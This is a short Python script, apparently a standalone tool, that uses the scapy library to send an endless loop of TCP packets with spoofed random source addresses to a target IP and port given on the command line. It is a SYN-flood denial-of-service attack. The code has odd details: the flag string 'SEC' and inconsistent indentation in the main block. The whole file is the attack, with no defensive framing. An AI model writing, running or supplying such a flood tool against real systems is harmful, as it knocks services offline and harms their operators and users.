import sys
from scapy.all import *

def syn(d_ip,d_port):
    packet=IP(src=RandIP(),dst=d_ip)/TCP(sport=RandNum(1024,65535),dport=d_port,flags='SEC')
    send(packet,loop=True)

if __name__ == "__main__":
   if len(sys.argv) < 3:
	    print("Usage: {} <destination IP><port>".format(sys.argv[0]))
	    sys.exit(1)
	  
syn(sys.argv[1],int(sys.argv[2]))
